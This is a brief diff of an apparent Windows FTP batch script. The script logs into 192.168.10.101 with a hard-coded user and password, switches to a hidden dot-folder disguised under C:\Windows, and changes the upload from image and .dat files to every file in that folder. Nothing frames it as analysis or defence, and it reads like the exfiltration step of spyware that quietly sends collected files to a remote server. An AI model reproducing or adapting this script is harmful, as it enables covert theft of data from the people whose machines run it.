@@ -2,11 +2,9 @@ open 192.168.10.101
 ftpuser
 12345qwert
 prompt off
-lcd C:\Users\Administrator\WinSys\ftp\cfg
+lcd C:\Windows\.WinSys\.cfg
 binary
-mput *.png
-mput *.jpg
-mput *.dat
+mput *
 prompt on
 bye
 quit
